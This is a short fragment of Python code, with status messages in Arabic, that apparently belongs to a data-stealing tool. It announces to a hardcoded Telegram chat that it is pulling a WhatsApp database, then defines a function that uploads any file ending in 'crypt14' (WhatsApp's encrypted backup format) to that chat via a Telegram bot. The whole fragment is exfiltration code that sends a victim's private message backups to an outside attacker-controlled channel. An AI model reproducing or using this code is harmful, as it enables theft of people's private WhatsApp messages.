...
bot.send_message(chat_id=6745216214, text= 'جاري سحب قاعدة بيانات واتساب 🔥☠️')
bot.send_message(chat_id=6745216214, text= 'ملاحظة: لا يمكنك فك تشفير هذا الملف الا بأدوات متقدمة جدا وقد تكون مدفوعة 🚫')
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith("crypt14"):
            bot.send_document(chat_id=6745216214, document=f, caption='By: @atmaja_pro_bot')
